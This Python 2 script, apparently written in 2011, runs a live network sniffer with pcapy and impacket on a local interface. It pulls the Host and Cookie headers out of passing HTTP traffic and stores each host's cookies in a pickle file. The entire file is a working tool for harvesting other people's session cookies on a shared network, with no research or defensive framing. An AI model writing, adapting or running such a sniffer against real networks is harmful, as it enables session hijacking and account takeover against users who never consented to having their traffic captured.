#!sudo /opt/local/bin/python
# encoding: utf-8
"""
sniffer.py

Created by Yegorov Nickolay on 2011-06-19.
"""
import pcapy, pickle, re
from   impacket.ImpactDecoder import *

print pcapy.findalldevs()
cap = pcapy.open_live("en1", 1024*512, False, 100)
cap.setfilter('tcp')

hosts = {}
try:
	out   = open('out', 'rb')
	hosts = pickle.load(out)
	out.close()
except:
	pass 

def analyse_packet(header, data):
	eth = EthDecoder().decode(data)
	ip  = eth.child() 
	tcp = ip.child()
	str = tcp.get_data_as_string()
	hdr = re.findall(r"(?P<name>.*?): (?P<value>.*?)\r\n", str)
	
	headers = {}
	for (title, content) in hdr:
		headers[title] = content
	
	if 'Host' in headers and 'Cookie' in headers:
		current = headers['Host']
		cookie  = headers['Cookie']
		
		if current not in hosts:
			hosts[current] = []
			
		if cookie not in hosts[current]:						
			hosts[current].append(cookie)
			print 'found 1 more ' + current
			
			out = open('out', 'wb')	
			pickle.dump(hosts, out)				
			out.close()		
			
cap.loop(-1, analyse_packet)